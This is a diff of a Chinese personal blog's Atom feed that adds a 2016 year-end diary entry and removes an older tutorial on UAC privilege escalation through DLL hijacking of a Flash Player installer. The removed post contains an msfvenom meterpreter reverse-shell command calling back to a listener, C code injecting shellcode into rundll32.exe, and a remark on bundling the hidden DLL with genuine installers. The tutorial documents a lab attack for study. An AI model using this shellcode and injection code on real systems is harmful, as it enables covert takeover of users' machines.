@@ -4,7 +4,7 @@
   <subtitle><![CDATA[云淡风轻]]></subtitle>
   <link href="/atom.xml" rel="self"/>
   <link href="http://blog.idhyt.com/"/>
-  <updated>2016-11-16T04:33:02.000Z</updated>
+  <updated>2017-01-01T17:56:40.000Z</updated>
   <id>http://blog.idhyt.com/</id>
   
   <author>
@@ -13,6 +13,37 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[我的2016]]></title>
+    <link href="http://blog.idhyt.com/2017/01/01/diary-annual-summary-2016/"/>
+    <id>http://blog.idhyt.com/2017/01/01/diary-annual-summary-2016/</id>
+    <published>2017-01-01T03:15:11.000Z</published>
+    <updated>2017-01-01T17:56:40.000Z</updated>
+    <content type="html"><![CDATA[<p>&#160; &#160; &#160; &#160;昨晚同事一起吃了饭然后打算去市区感受一下跨年气氛，由于我们都喝了酒，就让一个女生开车，晃晃悠悠的一走二停三熄火愣是在车上跨了个年。新年第一天去朋友家里玩了一天还挺开心的，10来个人做了一大桌菜胡吃海喝的，突然想起来之前在珠海和同事一起吃火锅的时候，也是在家里一大桌人边吃边吐槽公司，慢慢的大家都分散到各个地方了，平时没事真的应该多聚一聚，吃个饭聊聊天都挺好，真的不能想着反正大家都在一个城市，以后时间多慢慢聚，从我最近聚的几次来看，脱到最后大家聚一起的时候，基本都是有人要离开的时候。</p>
+<hr>
+
+<p>&#160; &#160; &#160; &#160;其实今年本来不打算写总结了的，后来想想还是记录一下吧，以后回想起来也能有个时间轴，今年对我来说还是挺重要的。年初认真思考了一下工作的事情，其实也是考虑蛮久了，然后辞了第一份工作，当时我只是觉得自己做了在那个时间点该做的决定，所以也没留下什么遗憾，只是突然离开了长期生活的地方还是会有点懵逼。之后自己来了一场说走就走的旅行，出去了一个多月，把想去的地方都逛了一下，回了一趟家，然后换了下一份工作。工作过后跳槽和刚毕业择业已经有了质的不同，刚毕业基本觉得公司和薪资ok就可以了，至于做什么其实是没有太多概念的，都是到公司后按需求走的，工作过后跳槽就有了明确的目标和方向，所以也没有投几家公司，最后选择的offer还算满意，工作环境和工作内容基本都符合了我的预期。其实学东西最快的时候是在入职的半年里，很多东西都是由不知到知的过程，会觉得每天都有新的事情要做，每天都有新的问题要解决，仿佛回到了刚毕业时候求知欲特别旺盛的状态，然后每天下班后还坚持跑5公里再回家，回家冲个澡坐在阳台上想一些事情真是格外精神，我以为我可以安下心来在这里好好沉淀一下，不管是思维模式还是技术方面，可是啊，人生总是充满了意外，半年后我再次离职了。</p>
+<hr>
+
+<p>&#160; &#160; &#160; &#160;曾经我想过无数种可能以后将要工作和定居的地方，却没有料到我竟然又回到了成都，可能冥冥之中吧，有好多的如果，促使成这样一个结果，我觉得应该是值得庆幸的事情。可能没有这么多如果我的人生会是另外一个支线，但我相信我的这个选择对我来说会更有意义一些，其实仔细想想呢，人生苦短，想那么多干嘛，在对的时间做自认为对的决定，时间就是最好的证明。</p>
+<hr>
+
+<p>&#160; &#160; &#160; &#160;太多生活琐事就不记录了，2016年我对生活和工作又有了很多的想法和见解，是我思想和心智转变比较多的一年，2017年将会是充满疑惑和忙碌的一年，我希望在这一年中，自己能够成为自己想要成为的模样的同时发现更多更好玩的事情。虽然每年这个时候想的愿望都没能实现，但是愿望还是要有的，心诚则灵万一实现了呢。新的一年我希望家人和朋友身体健康，每天都开开心心，年底之前都能实现自己的愿望。</p>
+<hr>
+
+
+<p>&#160; &#160; &#160; &#160;最后，我希望我的生活和我的朋友，其淡如水，久尝而不腻。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>&#160; &#160; &#160; &#160;昨晚同事一起吃了饭然后打算去市区感受一下跨年气氛，由于我们都喝了酒，就让一个女生开车，晃晃悠悠的一走二停三熄火愣是在车上跨了个年。新年第一天去朋友家里玩了一天还挺开心的，10来个人做了一大桌菜胡吃海喝的，突然想起来之前在]]>
+    </summary>
+    
+      <category term="无法描述" scheme="http://blog.idhyt.com/tags/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
+    
+      <category term="diary" scheme="http://blog.idhyt.com/categories/diary/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[KERNEL SECURITY FLAWS (0day for nexus4)]]></title>
@@ -1268,66 +1299,6 @@ iov[<span class="number">0x200</span>]-&gt;iov_len = ????????;
       <category term="xposed" scheme="http://blog.idhyt.com/tags/xposed/"/>
     
       <category term="android" scheme="http://blog.idhyt.com/categories/android/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[借用UAC完成的提权思路]]></title>
-    <link href="http://blog.idhyt.com/2015/08/31/exploit-privilege-escalation-by-uac/"/>
-    <id>http://blog.idhyt.com/2015/08/31/exploit-privilege-escalation-by-uac/</id>
-    <published>2015-08-31T14:41:11.000Z</published>
-    <updated>2016-11-10T05:24:04.000Z</updated>
-    <content type="html"><![CDATA[<h2 id="背景">背景</h2><p>UAC(User Account Control，用户帐户控制)是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员‌密码。也就是说一旦用户允许启动的应用程序通过UAC验证，那么这个程序也就有了管理员权限。如果我们通过某种方式劫持了通过用户UAC验证的程序，那么相应的我们的程序也就实现了提权的过程。</p>
-<a id="more"></a>
-<h2 id="提权过程概述">提权过程概述</h2><p>首先我们找到目标程序，查找其动态加载的dll文件然后将其替换掉，插入我们包含shellcode的dll文件，这样用户在安装此文件的时候就会调用我们的dll文件，并执行我们的shellcode代码。同时为了防止程序崩掉导致我们的代码退出，采用注入的方式保证shellcode的稳定执行。在此过程中，如果目标程序请求UAC权限，对于用户来说这是一个正常的安装文件，一旦通过UAC验证，相应我们的shellcode也完成了提权过程。替换安装包dll文件这种行为太过于敏感，其实最后实现的方式是找到目标程序需要加载的，并且当前目录又不存在的需要联网下载的dll文件，我们只需要在该目录下放一个同名dll文件即可。</p>
-<h2 id="实验环境">实验环境</h2><ul>
-<li><p>Kali Debian7<br>Kali集成Metasploit等漏洞利用工具，方便提取shellcode和反弹TCP连接。最好安装一个Mingw-w64用于编译c代码。</p>
-</li>
-<li><p>windows7 x64<br>主要的目标测试环境。</p>
-</li>
-<li><p>Procmon.exe<br>Procmon是微软出的一款强大的Windows监视工具，不但可以监视进程/线程，还可以监控到文件系统，注册表的变化等。</p>
-</li>
-<li><p>install_flashplayer15x32_mssd_aaa_aih<br>这里我们以flashplayer安装文件作为目标文件，版本为15x32_mssd_aaa_aih，可自行下载，或者从最后的打包附件中找到。</p>
-</li>
-</ul>
-<h2 id="详细提权过程">详细提权过程</h2><h3 id="查找可劫持的dll文件">查找可劫持的dll文件</h3><p>首先我们在win7系统下先打开procmon监控软件，清除一下日志信息，然后运行我们的目标文件install_flashplayer15x32_mssd_aaa_aih，运行过后会弹出UAC选项，需要用户确认授权。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-privilege-escalation-by-uac-1.jpg" alt=""></p>
-<p>这里我们点“是”，然后安装包开始安装并自删除，并从服务器下载所需的文件，这时候就可以关掉了，因为我们只需要看该软件包都加载了哪些dll文件。</p>
-<p>看下Procmon.exe记录所有行为<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-privilege-escalation-by-uac-2.jpg" alt=""></p>
-<p>信息量太大，我们需要过滤出有用的信息。</p>
-<p>首先是只看我们目标进程的信息，添加过滤规则：</p>
-<pre><code><span class="keyword">Process</span> Name <span class="keyword">is</span> install_flashplayer15x32_mssd_aaa_aih
-</code></pre><p>然后是过滤掉加载系统的dll文件，只看安装包当前目录下加载的dll文件，我这里安装包存放在dllhijack文件夹下，添加过滤规则：</p>
-<pre><code>Path <span class="keyword">contains</span> dllhijack
-</code></pre><p>并且该加载dll不存在，需要联网从服务器下载，最后再添加一个过滤规则：</p>
-<pre><code><span class="keyword">Result</span> <span class="keyword">is</span> NAME <span class="keyword">NOT</span> FOUND
-</code></pre><p>三个过滤规则如下所示：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-privilege-escalation-by-uac-3.jpg" alt=""></p>
-<p>经过三个规则过滤后，留下的信息就很明显了，如下图所示：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-privilege-escalation-by-uac-4.jpg" alt=""></p>
-<p>上边所列的dll文件都是会尝试加载，并且找不到，会联网进行下载的dll文件，因此，我们的目标就是劫持这些dll文件，也不需要替换，直接将我们的dll文件放在安装包同目录即可，这也是为什么选择这个安装程序测试的原因。如果选择其他安装包测试的，最好也是选择这种联网安装类型的，所有文件都从服务器拉取，如果安装程序没有对这些从服务器拉取的文件进行效验，就能够被劫持。</p>
-<h3 id="编写exploit">编写exploit</h3><p>找到劫持了dll文件后，我们进入Debian系统用msf生成shellcode，这里我们选择反弹tcp的shellcode，需要知道服务器ip地址和监听端口，这里也选择Debian系统作为服务器，ifconfig查看下ip，设置监听端口为9000，最后执行如下命令生成shellcode:</p>
-<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.127</span><span class="number">.133</span> LPORT=<span class="number">9000</span> -f c
-</code></pre><p><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-privilege-escalation-by-uac-5.jpg" alt=""></p>
-<p>为了防止程序挂掉或者退出导致shellcode也跟着退出，采用注入的方式，将shellcode注入rundll32.exe进程，然后连接远程端口。服务器监听该端口，一旦有请求就建立会话连接，注入关键代码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (CreateProcess(<span class="number">0</span>, <span class="string">"rundll32.exe"</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, CREATE_SUSPENDED | IDLE_PRIORITY_CLASS, <span class="number">0</span>, <span class="number">0</span>, &amp;si, &amp;pi)) &#123;</span><br><span class="line">	ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;</span><br><span class="line">	GetThreadContext(pi.hThread, &amp;ctx);</span><br><span class="line"></span><br><span class="line">	ep = (LPVOID)VirtualAllocEx(pi.hProcess, <span class="literal">NULL</span>, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	WriteProcessMemory(pi.hProcess, (PVOID)ep, &amp;code, SCSIZE, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="preprocessor">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">			ctx.Rip = (DWORD64)ep;</span><br><span class="line">	<span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">			ctx.Eip = (DWORD)ep;</span><br><span class="line">	<span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	SetThreadContext(pi.hThread, &amp;ctx);</span><br><span class="line"></span><br><span class="line">	ResumeThread(pi.hThread);</span><br><span class="line">	CloseHandle(pi.hThread);</span><br><span class="line">	CloseHandle(pi.hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>最后将程序编译，这里编译直接在Debian系统下用Mingw-w64编译，命令入下：</p>
-<pre><code>root<span class="variable">@idhyt</span><span class="symbol">:~/maldemo</span><span class="comment"># i686-w64-mingw32-gcc template.c -o template.dll –shared</span>
-root<span class="variable">@idhyt</span><span class="symbol">:~/maldemo</span><span class="comment"># file template.dll</span>
-template.<span class="symbol">dll:</span> <span class="constant">PE32</span> executable (<span class="constant">DLL</span>) (console) <span class="constant">Intel</span> <span class="number">80386</span>, <span class="keyword">for</span> <span class="constant">MS</span> <span class="constant">Windows</span>
-</code></pre><p>将编译好的template.dll拷贝到win7系统中备用。<br>debian系统设置服务器并监听9000端口，所有命令如下：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-privilege-escalation-by-uac-6.jpg" alt=""></p>
-<h3 id="提权">提权</h3><p>将编译的template.dll文件放在install_flashplayer15x32_mssd_aaa_aih目录下，从我们监控到的可劫持dll文件中选择一个，这里我选择dhcpcsv6.dll。将我们的dll文件改名为dhcpcsvc6.dll，其他dll文件可自行尝试。之后重新运行安装包，弹出UAC选项后点“是”。</p>
-<p>之后我们在debian系统的服务端会看到我们已经监听到了这个端口，看下会话信息：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-privilege-escalation-by-uac-7.jpg" alt=""></p>
-<p>查看下当前uid，然后执行getsystem命令权限：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-privilege-escalation-by-uac-8.jpg" alt=""></p>
-<p>可以看到已经提权成功，然后进入shell查看下文件，运行个计算器什么的。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-privilege-escalation-by-uac-9.jpg" alt=""></p>
-<h2 id="总结">总结</h2><p>UAC很大程度上减少PC受到恶意软件侵害的机会，但是并不表明是不可被利用的。通过这种dll劫持方式，可以将dll文件设置为隐藏，并将正常的软件(如adobe flash player)打包给用户，用户基本是察觉不到的，一旦用户正常安装，机器就会被攻击者控制。一些病毒通过劫持lpk.dll等系统dll文件造成的病毒体执行，也是利用这种思路。</p>
-<p>代码和安装包上传<a href="http://pan.baidu.com/s/1ntAbfQD" target="_blank" rel="external">百度网盘</a>，<br>密码: rmsq 解压码：ks123456</p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<h2 id="背景">背景</h2><p>UAC(User Account Control，用户帐户控制)是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员‌密码。也就是说一旦用户允许启动的应用程序通过UAC验证，那么这个程序也就有了管理员权限。如果我们通过某种方式劫持了通过用户UAC验证的程序，那么相应的我们的程序也就实现了提权的过程。</p>]]>
-    
-    </summary>
-    
-      <category term="uac" scheme="http://blog.idhyt.com/tags/uac/"/>
-    
-      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
     
   </entry>
   
